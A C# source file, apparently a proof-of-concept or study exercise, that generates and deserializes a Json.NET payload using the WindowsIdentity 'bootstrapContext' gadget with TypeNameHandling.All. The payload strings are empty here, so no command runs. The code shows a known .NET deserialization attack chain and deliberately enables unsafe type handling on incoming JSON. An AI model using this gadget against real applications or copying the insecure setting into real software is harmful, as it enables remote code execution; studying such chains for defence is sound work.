using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace JsonNet_1
{
    [Serializable]
    public class WindowsIdentityTest : ISerializable
    {
        public WindowsIdentityTest(string strcontent)
        {
            StrContent = strcontent;
        }

        private string StrContent { get; }

        // 继承ISerializable，由用户控制序列化和反序列化的过程，关键便是使用 GetObjectDatta 将需要序列化的数据添加到SerializationInfo info中
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", StrContent);
        }

    }


    class Program
    {
        static void genPayload()
        {
            string strConent =
                "";
            var obj = new WindowsIdentityTest(strConent);
            var jsonset= new JsonSerializerSettings {
                TypeNameHandling = TypeNameHandling.All,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full
            };
            string objson = JsonConvert.SerializeObject(obj, jsonset);
            Console.WriteLine(objson);

            Type targetType = typeof(WindowsIdentity);
            String targetTypeName = targetType.AssemblyQualifiedName;
            Console.WriteLine(targetTypeName);
        }

        static void DeserPayload()
        {
            string payload = @"{""$type"":""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"",""System.Security.ClaimsIdentity.bootstrapContext"":""""}";

            var jsonSet = new JsonSerializerSettings
            {
                //TypeNameHandling = TypeNameHandling.None
                TypeNameHandling = TypeNameHandling.All
            };

            Object obj = JsonConvert.DeserializeObject(payload, jsonSet);
        }

        static void Main(string[] args)
        {
            //genPayload();
            DeserPayload();
        }
    }
}
